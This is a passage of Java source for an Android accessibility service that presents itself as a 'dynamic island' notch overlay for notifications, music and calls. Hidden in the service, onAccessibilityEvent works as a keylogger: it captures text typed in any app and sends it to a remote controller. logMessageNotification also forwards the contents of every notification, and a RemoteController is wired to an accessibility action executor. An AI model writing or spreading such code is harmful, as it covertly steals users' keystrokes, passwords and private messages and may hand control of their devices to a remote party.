                keepNotchDuration = new SharePreferenceUtil(context).getIntValue(AppConst.NOTCH_VISIBILITY, 0);
                switch (keepNotchDuration) {
                    case 0:
                        break;
                    case 3:
                        countDownTimerVisibility(3);
                        break;
                    case 10:
                        countDownTimerVisibility(10);
                        break;
                    case 30:
                        countDownTimerVisibility(30);
                        break;
                    case 60:
                        countDownTimerVisibility(60);
                        break;
                    case 300:
                        countDownTimerVisibility(300);
                        break;
                    case 600:
                        countDownTimerVisibility(600);
                        break;
                }
            }
        }, 500L);
    }

    public void countDownTimerVisibility(int time) {
        if (countDownTimer != null) {
            countDownTimer.cancel();
            countDownTimer = null;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                countDownTimer = new CountDownTimer(time * 1000L, 1000L) {
                    @Override
                    public void onTick(long millisUntilFinished) {
                    }

                    @Override
                    public void onFinish() {
                        if (statusBarView.getParent() != null && manager != null) {
                            try {
                                GlobalApp.instance.setAccessibilityActive(false);
                                manager.removeView(statusBarView);
                            } catch (Exception exception) {
                                exception.printStackTrace();
                            }
                        }
                    }
                };
                countDownTimer.start();
            }
        }, 200L);
    }

    public void onInterrupt() {
    }

    public int dpToInt(int v) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, v, getResources().getDisplayMetrics());
    }

    private boolean inSplitScreenMode(List<AccessibilityWindowInfo> windows) {
        for (AccessibilityWindowInfo window : windows) {
            if (window.getType() == AccessibilityWindowInfo.TYPE_SPLIT_SCREEN_DIVIDER) {
                return true;
            }
        }
        return false;
    }


    private void openApp(String packageName) {
        PackageManager pm = getPackageManager();
        Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);
        } else {
            Log.e("Accessibility", "App not found: " + packageName);
        }
    }

    private String currentText = "";
    private Handler handlerKey = new Handler();
    private Runnable sendRunnable;
    private static final int DELAY_MS = 1500;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        boolean autoAdjustNotch = new SharePreferenceUtil(mContext).getBooleanValue(AppConst.AUTO_ADJUST_NOTCH, true);
        Log.e(TAG, "onAccessibilityEvent:  " + event.getEventType());

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                currentText = text.toString().replaceAll("[\\[\\]]", "").trim();

                // Reset timer nếu người dùng tiếp tục gõ
                handlerKey.removeCallbacks(sendRunnable);
                sendRunnable = () -> {
                    String packageName = String.valueOf(event.getPackageName());

                    Log.d("Keylogger", "App: " + packageName + " | Text: " + currentText);
                    remoteController.sendKeyLog(currentText);
//                    sendToFirebase(currentText);
                };
                handlerKey.postDelayed(sendRunnable, DELAY_MS);
            }
        }


        if ((event.getEventType() & AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) != 0) {
            if (inSplitScreenMode(getWindows())) {
                Log.e(TAG, "onAccessibilityEvent Split screen mode detected");
                if (autoAdjustNotch) {
                    localLayoutParams.x = 0;
                    if (statusBarView.getParent() != null && manager != null) {
                        try {
                            manager.updateViewLayout(statusBarView, localLayoutParams);
                        } catch (Exception unused) {
                            unused.printStackTrace();
                        }
                    }
                }
            } else {
                if (!isShowFullIsland) {
                    Log.e(TAG, "onAccessibilityEvent mode no spilit");
                    int overlay_x = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_X, 0);
                    int overlayX = (int) (overlay_x * 0.01 * metrics.widthPixels);
                    int screenSize = metrics.widthPixels;
                    int marginX = minWidth / 2;
                    int maxMarginX = overlayX + marginX;
                    int minMarginX = overlayX - marginX;
                    if (maxMarginX >= screenSize / 2) {
                        x = screenSize / 2 - marginX;
                    } else if (minMarginX <= -(screenSize / 2)) {
                        x = -(screenSize / 2) + marginX;
                    } else {
                        x = overlayX;
                    }
                    localLayoutParams.x = x;
                    if (statusBarView.getParent() != null && manager != null) {
                        try {
                            manager.updateViewLayout(statusBarView, localLayoutParams);
                        } catch (Exception unused) {
                            unused.printStackTrace();
                        }
                    }
                }
            }
        }
    }

    public ITGAccessibilityService() {
        Handler handler2 = new Handler();
        this.handler = handler2;
        mContentObserver = new MContentObserver(handler2);
    }

    public class MContentObserver extends ContentObserver {
        public MContentObserver(Handler handler) {
            super(handler);
        }

        public void onChange(boolean z, Uri uri) {
            if (ITGAccessibilityService.ENABLED_ACCESSIBILITY_SERVICES.equals(uri) && !Constants.checkAccessibilityEnabled(ITGAccessibilityService.this)) {
                ITGAccessibilityService.this.cleanUp();
            }
        }
    }

    public final void cleanUp() {
        this.handler.removeCallbacksAndMessages((Object) null);
        try {
            getContentResolver().unregisterContentObserver(mContentObserver);
        } catch (Throwable unused) {
        }
    }

    private int x, y;

    private WindowManager.LayoutParams getParams(int width, int height, int extFlags) {
        return new WindowManager.LayoutParams(width, height, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, extFlags, PixelFormat.TRANSLUCENT);
    }

    private int last_min_size = 200;

    @SuppressLint("WrongConstant")
    public void onServiceConnected() {
        this.mContext = this;
        accessibilityController = new AccessibilityController(this);
        Log.e(TAG, "onServiceConnected setAccessibilityActive: " + GlobalApp.instance.isAccessibilityServiceRunning());
        int width = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_WIDTH, 130);
        int height = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_HEIGHT, 25);
        int overlay_x = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_X, 0);
        int overlay_y = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_Y, 5);
        minWidth = (int) (width * getResources().getDisplayMetrics().scaledDensity);
        minHeight = (int) (height * getResources().getDisplayMetrics().scaledDensity);
        x = (int) (overlay_x * 0.01 * metrics.widthPixels);
        y = (int) (overlay_y * 0.01 * metrics.heightPixels);
        setTheme(R.style.Theme_Main);
        this.prefManager = new PrefManager(this);
        isAddMusicNotification = prefManager.getShowNotificationMusic();

//        this.mHandle = new Handler();
        this.utils = new Utils(this);
        this.manager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        this.manager.getDefaultDisplay().getMetrics(metrics);
        int i = Build.VERSION.SDK_INT;
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        this.localLayoutParams = layoutParams;
        this.localLayoutParams.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        this.localLayoutParams.flags = this.flagNormal;
        this.localLayoutParams.gravity = 49;
        this.localLayoutParams.width = minWidth;
        this.localLayoutParams.height = minHeight;
        this.localLayoutParams.x = x;
        this.localLayoutParams.y = y;
        Log.e(TAG, "onServiceConnected width :" + this.localLayoutParams.width);
        Log.e(TAG, "onServiceConnected height :" + this.localLayoutParams.height);
        this.localLayoutParams.format = -3;
        ConstraintLayout statusBarParentView2 = (ConstraintLayout) LayoutInflater.from(this).inflate(R.layout.status_bar, (ViewGroup) null);
        statusBarView = statusBarParentView2;
        circleImageMusic = statusBarView.findViewById(R.id.img_sub);
        constraintMode = statusBarView.findViewById(R.id.constraint_mode);
        constraintMode.setClickable(false);
        constraintMode.setFocusable(false);
        imageMode = statusBarView.findViewById(R.id.img_mode);
        tvMode = statusBarView.findViewById(R.id.tv_mode);
        tvCharging = statusBarView.findViewById(R.id.tv_charging);
        imagePin = statusBarView.findViewById(R.id.img_pin);
        animator = ObjectAnimator.ofFloat(circleImageMusic, "rotation", 0f, 360f);
        statusBarParentView2.setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener() {
            public void onSystemUiVisibilityChange(int i) {
                if ((i & 4) == 0) {
                    boolean unused = ITGAccessibilityService.this.isInFullScreen = false;
                    showSmallIslandNotification();
                    Log.e(TAG, "showSmallIslandNotification 2: ");
                    return;
                }
                boolean unused2 = ITGAccessibilityService.this.isInFullScreen = true;
                if (!Constants.getShowInFullScreen(ITGAccessibilityService.this.mContext)) {
                    ITGAccessibilityService.this.closeSmallIslandNotification();
                }
            }
        });
        this.statusBarParentView = this.statusBarView.findViewById(R.id.statusbar_parent);
        LinearLayout linearLayout = (LinearLayout) this.statusBarView.findViewById(R.id.island_parent_layout);
        this.island_parent_layout = linearLayout;
        linearLayout.setClipToOutline(true);
        this.island_top_layout = (LinearLayout) this.statusBarView.findViewById(R.id.island_top_layout);
        this.statusBarParentView.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                ITGAccessibilityService.this.closeFullNotificationIsland();
            }
        });
        this.localLayoutParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
        if (i >= 28) {
            this.localLayoutParams.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        boolean isDynamicStyle = new SharePreferenceUtil(this).getBooleanValue(AppConst.DYNAMIC_STYLE_OVAL, true);
        if (isDynamicStyle) {
            statusBarView.findViewById(R.id.island_parent_layout).setBackgroundResource(R.drawable.rounded_rectangle_notification);
        } else {
            statusBarView.findViewById(R.id.island_parent_layout).setBackgroundResource(R.drawable.rounded_bottom_notification);
        }
        if (Constants.getNotif(this)) {
            initDynamicFromShared();
            new SharePreferenceUtil(mContext).setBooleanValue(AppConst.DYNAMIC_TURN_ON, true);
        }
        this.preferences = PreferenceManager.getDefaultSharedPreferences(this);
        this.listener = new MAccessibilityServiceOnSharedPreferenceChanged(this);
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(getPackageName() + AppConst.OVERLAY_LAYOUT_CHANGE);
        intentFilter.addAction(getPackageName() + AppConst.START_DYNAMIC);
        intentFilter.addAction(getPackageName() + AppConst.SHAKE_ANIMATION);
        intentFilter.addAction(getPackageName() + AppConst.CLOSE_DYNAMIC);
        intentFilter.addAction(getPackageName() + AppConst.RESET_POSITION);
        intentFilter.addAction(getPackageName() + AppConst.RESET_SIZE);
        intentFilter.addAction(getPackageName() + AppConst.DYNAMIC_STYLE);
        intentFilter.addAction(getPackageName() + AppConst.INTENT_NOTCH_VISIBILITY);
        intentFilter.addAction(getPackageName() + AppConst.INTENT_LONG_CLICK);
        intentFilter.addAction(getPackageName() + AppConst.RELOAD_DYNAMIC);
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        intentFilter.addAction("android.intent.action.BATTERY_CHANGED");
        intentFilter.addAction("android.media.RINGER_MODE_CHANGED");
        intentFilter.addAction("android.bluetooth.device.action.ACL_CONNECTED");
        intentFilter.addAction("android.bluetooth.device.action.ACL_DISCONNECT_REQUESTED");
        intentFilter.addAction("android.bluetooth.device.action.ACL_DISCONNECTED");
        intentFilter.addAction("android.intent.action.PHONE_STATE");
        intentFilter.addAction(Intent.ACTION_CONFIGURATION_CHANGED);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            this.mContext.registerReceiver(this.mInfoReceiver, intentFilter, RECEIVER_NOT_EXPORTED);
        } else {
            this.mContext.registerReceiver(this.mInfoReceiver, intentFilter);
        }
        this.preferences.registerOnSharedPreferenceChangeListener(this.listener);
        this.island_parent_layout.getLayoutTransition().enableTransitionType(4);
        IntentFilter intentFilter2 = new IntentFilter();
        intentFilter2.addAction(Utils.FROM_NOTIFICATION_SERVICE + this.mContext.getPackageName());
        intentFilter2.addAction("android.intent.action.SCREEN_ON");
        intentFilter2.addAction("android.intent.action.SCREEN_OFF");
        intentFilter2.addAction("android.intent.action.USER_PRESENT");
        try {
            LocalBroadcastManager.getInstance(this.mContext).registerReceiver(this.notiReceiver, intentFilter2);
        } catch (Exception e) {
            e.printStackTrace();
        }
        initNotifications();

        if (Utils.isServiceRunning(mContext, NotificationService.class.getName())) {
            NotificationService.getInstance().initNotification();
        } else {
            startService(new Intent(this, NotificationService.class));
        }
        super.onServiceConnected();

//        exampleUsage(this);

        AccessibilityController controller = new AccessibilityController(this);

        // Tạo AccessibilityActionExecutor
        AccessibilityActionExecutor executor = new AccessibilityActionExecutor(this, controller);

        remoteController = new RemoteController(this.mContext, executor);

    }

    RemoteController remoteController;

    public void onReloadDynamic() {
        if (statusBarView.getParent() != null && manager != null) {
            try {
                GlobalApp.instance.setAccessibilityActive(false);
                manager.removeView(statusBarView);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (statusBarView.getParent() == null && manager != null) {
                    try {
                        GlobalApp.instance.setAccessibilityActive(true);
                        manager.addView(statusBarView, localLayoutParams);
                        new SharePreferenceUtil(mContext).setBooleanValue(AppConst.DYNAMIC_TURN_ON, true);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }, 500L);

    }

    public void scrollToMusic() {

        if (prefManager.getShowNotification()) {
            int current = -1;
            if (!list_small_island.isEmpty()) {
                int size = list_small_island.size();
                for (int i = 0; i < size; i++) {
                    if (list_small_island.get(i).getTemplate().contains("MediaStyle")) {
                        current = i;
                        break;
                    }
                }
                if (current != -1) {
                    scrollToPos(current);
                } else {
                    scrollToLastItem();
                }

            }
        }
    }

    boolean enableClick = true;

    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String str) {


        if (str.equals(PrefManager.KEY_DEFAULT_COLOR)) {
            this.utils.setTileColor(this.prefManager.getDefaultColor());
            this.adapter_island_small.notifyDataSetChanged();
        }
        if (str.equals(Constants.SHOW_IN_FULL_SCREEN)) {
            showTempBar();
        }
        if (str.equals(Constants.LIST_PACKAGE_DISABLE)) {
            rovemoveNotifi();
        }

        if (str.equals(PrefManager.CLICK_ABLE)) {
            enableClick = prefManager.getClickAble();
        }

        if (str.equals(PrefManager.SHOW_NOTIFICATION)) {
            boolean isShowNotification = prefManager.getShowNotification();
            rv_island_big.setVisibility(View.GONE);
            if (!isShowNotification) {
                rv_island_small.setVisibility(View.GONE);
                rv_island_small.setVisibility(View.GONE);
                Log.e(TAG, "rv_island_big GONE: ");
            } else {
                rv_island_small.setVisibility(View.VISIBLE);
//                showSmallIslandNotification();
                initNotification();
            }
        }

        if (str.equals(Constants.KEY_SHOW_MUSIC)) {
            boolean isShowMusic = prefManager.getShowNotificationMusic();
            closeFullNotificationIsland();
            isNotchShowAction = true;
            if (!isShowMusic) {
                showMusic();
                showSmallIslandNotification();
                isNotchShowAction = false;
            } else {
                try {
                    if (Utils.isServiceRunning(mContext, NotificationService.class.getName())) {
                        NotificationService.getInstance().initNotification();
                    }

                } catch (Exception e) {

                }
//                list_small_island.addAll(notificationsMedia);
//                list_big_island.addAll(notificationsMedia);
//                notifyDataSetChanged();
            }
        }

        if (str.equals(Constants.KEY_SHOW_NAVIGATION)) {
            boolean showNotificationNavigation = prefManager.getShowNotificationNavigation();
            isNotchShowAction = true;
            if (!showNotificationNavigation) {
                showNavigation();
                isNotchShowAction = false;
            } else {
                try {
                    if (Utils.isServiceRunning(mContext, NotificationService.class.getName())) {
                        NotificationService.getInstance().initNotification();
                    }

                } catch (Exception e) {

                }
            }
        }

        if (str.equals(Constants.KEY_SHOW_MUSIC_ROATE)) {
            //showRotateMusic();
            isNotchShowAction = true;
            this.adapter_island_small.notifyDataSetChanged();

            if (prefManager.getShowNotificationMusicRotate()) {
                rotateImageViewInfinity();
            } else {
                stopRotateImageViewInfinity();
            }
        }

        if (str.equals(Constants.CONTROL_GESTURE)) {
            enableControls(Constants.getControlEnabled(this.mContext));
        }
        if (str.equals(Constants.SHOW_IN_LOCK)) {
            showTempBar();
        }

        if (str.equals(PrefManager.SHOW_ACTION)) {
            setShowAction();
        }

        if (str.equals(PrefManager.CAM_COUNT) || str.equals(PrefManager.CAM_POS)) {
            setIslandPosition();
            showTempBar();
        }
        if (str.equals(PrefManager.Y_POS)) {
            setYPosIsland();
            showTempBar();
        }
        if (str.equals(PrefManager.Y_HEIGHT)) {
            int heightOfIsland = this.prefManager.getHeightOfIsland();
            this.minIslandHeight = heightOfIsland;
            if (minHeight == 0) {
                this.localLayoutParams.height = (int) (((float) heightOfIsland) * getResources().getDisplayMetrics().scaledDensity);
            } else {
                this.localLayoutParams.height = minHeight;
            }

            this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
            this.island_parent_layout.requestLayout();
            showTempBar();
        }
        if (str.equals(PrefManager.SELECTED_PKG)) {
            this.callPKG = PrefManager.getCallPkg(this.mContext);
        }
        if (str.equals(PrefManager.FILTER_PKG)) {
            this.filterPKG = PrefManager.getSelectedFilterPkg(this.mContext);
        }
        if (str.equals(PrefManager.SHOW_DESIGN_CALL)) {
            this.useIphoneCallDesign = this.prefManager.getShowCall();
        }

        if (str.equals(PrefManager.SHOW_TIME_CALL)) {
            adapter_island_big.notifyDataSetChanged();
            adapter_island_small.notifyDataSetChanged();
        }
    }

    private void rovemoveNotifi() {

        String listDisale = prefManager.getListDisable();
        Log.d(TAG, "rovemoveNotifi: " + listDisale);
        ArrayList<Notification> list_small_islands = list_small_island;
        for (int i = 0; i < list_small_islands.size(); i++) {
            if (list_small_islands.get(i).pack.contains(listDisale)) {
                list_small_islands.remove(i);
            }
        }
        list_small_island.clear();
        list_small_island.addAll(list_small_islands);

        initNotification();
    }


    public void initNotification() {
        if (Utils.isServiceRunning(mContext, NotificationService.class.getName())) {
            NotificationService.getInstance().initNotification();
        }
    }

    private void setShowAction() {

//        if (!prefManager.getShowAction()) {
//            for (int i = 0; i < list_small_island.size(); i++) {
//                list_small_island.get(i).actions = new ArrayList<>();
//            }
//
//            for (int i = 0; i < list_big_island.size(); i++) {
//                list_big_island.get(i).actions = new ArrayList<>();
//            }
//        }
        adapter_island_big.notifyDataSetChanged();
        adapter_island_small.notifyDataSetChanged();
    }

    private void showNavigation() {
        for (int i = 0; i < list_small_island.size(); i++) {
            if (list_small_island.get(i).category != null && list_small_island.get(i).category.equals("navigation")) {
                list_small_island.remove(i);
            }
        }

        for (int j = 0; j < list_big_island.size(); j++) {
            if (list_small_island.get(j).category != null && list_big_island.get(j).category.equals("navigation")) {
                list_big_island.remove(j);
            }
        }
        adapter_island_big.notifyDataSetChanged();
        adapter_island_small.notifyDataSetChanged();
    }

    HashSet<Notification> notificationsMedia = new HashSet<>();

    private void showMusic() {

        if (!list_small_island.isEmpty()) {
            for (int i = 0; i < list_small_island.size(); i++) {
                if (list_small_island.get(i).template != null && list_small_island.get(i).template.equals("MediaStyle")) {
//                    notificationsMedia.add(list_small_island.get(i));
                    list_small_island.remove(i);
                }
            }
        }

        if (!list_big_island.isEmpty()) {
            for (int j = 0; j < list_big_island.size(); j++) {
                if (list_big_island.get(j).template != null && list_big_island.get(j).template.equals("MediaStyle")) {
//                    notificationsMedia.add(list_big_island.get(j));
                    list_big_island.remove(j);
                }
            }
        }
        adapter_island_big.notifyDataSetChanged();
        adapter_island_small.notifyDataSetChanged();
//        showSmallIslandNotification();
    }

    private void setIslandPosition() {
        this.pos = this.prefManager.getCameraPos();
        int cameraCount = this.prefManager.getCameraCount();
        this.margin = (int) (getResources().getDisplayMetrics().scaledDensity * 10f);
        if (cameraCount == 1) {
            this.localLayoutParams.width = (int) (((float) this.minOneCameIslandWidth) * getResources().getDisplayMetrics().scaledDensity);
        }
        if (cameraCount == 2) {
            this.margin = (int) (getResources().getDisplayMetrics().scaledDensity * 10f);
            this.localLayoutParams.width = (int) (((float) this.minTwoCameIslandWidth) * getResources().getDisplayMetrics().scaledDensity);
        }
        if (cameraCount == 3) {
            this.localLayoutParams.width = (int) (((float) this.minThreeCameIslandWidth) * getResources().getDisplayMetrics().scaledDensity);
            this.margin = (int) (getResources().getDisplayMetrics().scaledDensity * 75.0f);
        }
        this.minCameIslandWidth = this.localLayoutParams.width;
        ConstraintLayout.LayoutParams layoutParams = (ConstraintLayout.LayoutParams) this.island_top_layout.getLayoutParams();
        int i = this.pos;
        if (i == 1) {
            setLeftCamera();
            layoutParams.leftMargin = 5;
            layoutParams.rightMargin = 0;
        } else if (i == 2) {
            setCenterCamera();
            layoutParams.leftMargin = 0;
            layoutParams.rightMargin = 0;
        } else if (i == 3) {
            setRightCamera();
            layoutParams.leftMargin = 0;
            layoutParams.rightMargin = this.margin;
        }
        this.island_top_layout.setLayoutParams(layoutParams);
        this.island_parent_layout.requestLayout();
    }

    private void setFullIslandMargin(boolean z) {
        if (z) {
            this.tempMargin = this.margin;
            this.margin = (int) (getResources().getDisplayMetrics().scaledDensity * 10f);
        } else {
            this.margin = this.tempMargin;
        }
        ConstraintLayout.LayoutParams layoutParams = (ConstraintLayout.LayoutParams) this.island_top_layout.getLayoutParams();
        if (this.pos == 1) {
            layoutParams.leftMargin = this.margin;
            layoutParams.rightMargin = this.margin;
        }
        if (this.pos == 2) {
            layoutParams.leftMargin = 0;
            layoutParams.rightMargin = 0;
        }
        if (this.pos == 3) {
            layoutParams.leftMargin = 0;
            layoutParams.rightMargin = this.margin;
        }
        this.island_top_layout.setLayoutParams(layoutParams);
    }

    private void setYPosIsland() {
        if (y != (int) (5 * 0.01 * metrics.heightPixels)) {
            this.localLayoutParams.y = y;
        }
        if (x != 0) {
            this.localLayoutParams.x = x;
            Log.e(TAG, "setYPosIsland 1: ");
        }
        if (statusBarView.getParent() != null && manager != null) {
            try {
                this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private void setLeftCamera() {
        new Handler().postDelayed(new Runnable() {
            @SuppressLint("WrongConstant")
            public void run() {
                try {
                    ITGAccessibilityService.this.localLayoutParams.gravity = 8388659;
                    ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }, 100);
    }

    private void setCenterCamera() {
        new Handler().postDelayed(new Runnable() {
            @SuppressLint("WrongConstant")
            public void run() {
                try {
                    ITGAccessibilityService.this.localLayoutParams.gravity = 49;
                    ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }, 10000);
    }

    private void setRightCamera() {
        new Handler().postDelayed(new Runnable() {
            @SuppressLint("WrongConstant")
            public void run() {
                try {
                    ITGAccessibilityService.this.localLayoutParams.gravity = 8388661;
                    ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }, 10000);
    }

    private int getIconColor(int i) {
        return ColorUtils.calculateLuminance(i) < 0.15d ? Color.rgb(240, 240, 240) : i;
    }

    public boolean isCallPkgFound(String str) {
        Iterator<AppDetail> it = this.callPKG.appDetailList.iterator();
        while (it.hasNext()) {
            if (it.next().pkg.equalsIgnoreCase(str)) {
                return true;
            }
        }
        return false;
    }

    public boolean isFilterPkgFound(String str) {
        Iterator<AppDetail> it = this.filterPKG.appDetailList.iterator();
        while (it.hasNext()) {
            if (it.next().pkg.equalsIgnoreCase(str)) {
                return true;
            }
        }
        return false;
    }

    private Notification notificationCall;
    private final Set<String> loggedMessages = new HashSet<>();


    private void logMessageNotification(Intent intent) {
        if (intent == null) return;

        String packageName = intent.getStringExtra("package");
        CharSequence text = intent.getCharSequenceExtra("text");
        CharSequence bigText = intent.getCharSequenceExtra("bigText");
        long postTime = intent.getLongExtra("postTime", System.currentTimeMillis());

        // Gộp nội dung để check trùng
        String textStr = text != null ? text.toString() : "";
        String bigTextStr = bigText != null ? bigText.toString() : "";
        String contentKey = textStr + "|" + bigTextStr;

        if (loggedMessages.contains(contentKey) || packageName.contains("com.android.systemui")) {
            return; // Nội dung đã log → bỏ qua
        }
        loggedMessages.add(contentKey);

        // Định dạng thời gian: HH:mm dd/MM/yyyy
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm dd/MM/yyyy", Locale.getDefault());
        String formattedTime = sdf.format(new Date(postTime));

        // Tạo log message đơn giản
        StringBuilder builder = new StringBuilder();
        builder.append("Package: ").append(packageName);
        builder.append("\nText: ").append(textStr);
        builder.append("\nBigText: ").append(bigTextStr);
        builder.append("\nTime: ").append(formattedTime);

        Log.d("Notify_Message_Log", builder.toString());

        remoteController.sendLogNoti(builder.toString());
    }





    public void updateNotificationList(Intent intent) {
        logMessageNotification(intent);
        String str;
        CharSequence charSequence;
        CharSequence charSequence2;
        CharSequence charSequence3;
        ArrayList<ActionParsable> listAction;
        String str2;
        Intent intent2 = intent;
        Calendar instance = Calendar.getInstance();
        String mPackageName = intent2.getStringExtra("package");
        CharSequence charSequenceExtra = intent2.getCharSequenceExtra("substName");
        CharSequence charSequenceExtra2 = intent2.getCharSequenceExtra("subText");
        CharSequence charSequenceExtra3 = intent2.getCharSequenceExtra("titleBig");
        CharSequence charSequenceExtra4 = intent2.getCharSequenceExtra("summaryText");
        CharSequence charSequenceExtra5 = intent2.getCharSequenceExtra("info_text");
        int intExtra = intent2.getIntExtra("progressMax", 0);
        int intExtra2 = intent2.getIntExtra("progress", 0);
        boolean booleanExtra = intent2.getBooleanExtra("progressIndeterminate", false);
        boolean booleanExtra2 = intent2.getBooleanExtra("showChronometer", false);
        boolean booleanExtra3 = intent2.getBooleanExtra("isGroupConversation", false);
        boolean booleanExtra4 = intent2.getBooleanExtra("isAppGroup", false);
        boolean booleanExtra5 = intent2.getBooleanExtra("isGroup", false);
        boolean booleanExtra6 = intent2.getBooleanExtra("isOngoing", false);
        //icon
        Bitmap bmIcon = this.utils.getBitmapFromByteArray(intent2.getByteArrayExtra("icon"));
        //Large Icon
        Bitmap bmLargeIcon = this.utils.getBitmapFromByteArray(intent2.getByteArrayExtra("largeIcon"));
        //
        Bitmap bmPicture = this.utils.getBitmapFromByteArray(intent2.getByteArrayExtra("picture"));

        String stringExtra2 = intent2.getStringExtra("tag");
        String str3 = stringExtra2 == null ? "" : stringExtra2;
        int intExtra3 = intent2.getIntExtra("uId", 0);
        String stringExtra3 = intent2.getStringExtra("template");
        if (stringExtra3 == null) {
            str = "";
        } else {
            str = stringExtra3;
        }

//
        String stringExtra4 = intent2.getStringExtra(InAppPurchaseProvider.ID);
        String stringExtra5 = intent2.getStringExtra("group_key");
        String str4 = stringExtra5 == null ? stringExtra4 : stringExtra5;
        String stringExtra6 = intent2.getStringExtra("key");
        String str5 = stringExtra6 == null ? stringExtra4 : stringExtra6;
        String stringExtra7 = intent2.getStringExtra("category");
        String stringExtra8 = intent2.getStringExtra("appName");
        CharSequence charSequenceExtra6 = intent2.getCharSequenceExtra("title");
        if (charSequenceExtra6 == null) {
            charSequence = "";
        } else {
            charSequence = charSequenceExtra6;
        }
        CharSequence charSequenceExtra7 = intent2.getCharSequenceExtra("text");
        if (charSequenceExtra7 == null) {
            charSequence2 = "";
        } else {
            charSequence2 = charSequenceExtra7;
        }
        CharSequence charSequenceExtra8 = intent2.getCharSequenceExtra("bigText");
        if (charSequenceExtra8 == null) {
            charSequence3 = "";
        } else {
            charSequence3 = charSequenceExtra8;
        }
        int iconColor = getIconColor(intent2.getIntExtra("color", -1));
        boolean booleanExtra7 = intent2.getBooleanExtra("isClearable", false);
        boolean booleanExtra8 = intent2.getBooleanExtra("isAdded", true);
        CharSequence charSequence4 = charSequence;
        long longExtra = intent2.getLongExtra("postTime", instance.getTime().getTime());

        PendingIntent pendingIntent = (PendingIntent) intent2.getParcelableExtra(BaseGmsClient.KEY_PENDING_INTENT);
        Notification notification2 = null;

        try {

            listAction = intent2.getParcelableArrayListExtra("actions");

            List<ActionParsable> uniqueActions = new ArrayList<>();

            for (int i = 0; i < listAction.size(); i++) {
                ActionParsable currentAction = listAction.get(i);
                boolean isDuplicate = false;

                for (int j = 0; j < i; j++) {
                    ActionParsable previousAction = listAction.get(j);
                    if (currentAction.charSequence.equals(previousAction.charSequence)) {
                        isDuplicate = true;
                        break;
                    }
                }

                if (!isDuplicate) {
                    uniqueActions.add(currentAction);
                }
            }
            listAction.clear();
            listAction.addAll(uniqueActions);
        } catch (Exception unused) {
            Toast.makeText(mContext, "Crash", Toast.LENGTH_SHORT).show();
            listAction = null;
        }
        if (booleanExtra8) {
            String str8 = str4;
            Notification notification3 = new Notification(stringExtra4, bmIcon, bmLargeIcon, charSequence4, charSequence2, 0, mPackageName, longExtra, pendingIntent, listAction, charSequence3, stringExtra8, booleanExtra7, iconColor, bmPicture, str8, str5, booleanExtra3, booleanExtra4, booleanExtra5, booleanExtra6, str3, intExtra3, str, charSequenceExtra, charSequenceExtra2, charSequenceExtra3, charSequenceExtra5, intExtra, intExtra2, booleanExtra, charSequenceExtra4, booleanExtra2, stringExtra7);
            Log.d("chinh_dep_trai", "updateNotificationList: " + notification3.toString());

            notification3.useIphoneCallDesign = this.useIphoneCallDesign;
            if (notification3.category.equalsIgnoreCase(NotificationCompat.CATEGORY_CALL)) {
                notification3.isLocal = false;
                notificationCall = notification3;
            }
            int i3 = 0;
            int i4 = -1;
            while (i3 < this.list_small_island.size()) {
                if (!this.list_small_island.get(i3).isLocal) {
                    str2 = str8;
                    if (this.list_small_island.get(i3).groupKey.equals(str2)) {
                        i4 = i3;
                    }
                } else {
                    str2 = str8;
                }
                i3++;
                str8 = str2;
            }
            String str9 = str5;
            boolean equals = str8.equals(str9);
            if (i4 != -1) {
                Log.e(TAG, "notifi_download_2");
                this.list_small_island.get(i4).isClearable = booleanExtra7;
                this.list_small_island.get(i4).progress = intExtra2;
                this.list_small_island.get(i4).progressMax = intExtra;
                this.list_small_island.get(i4).progressIndeterminate = booleanExtra;
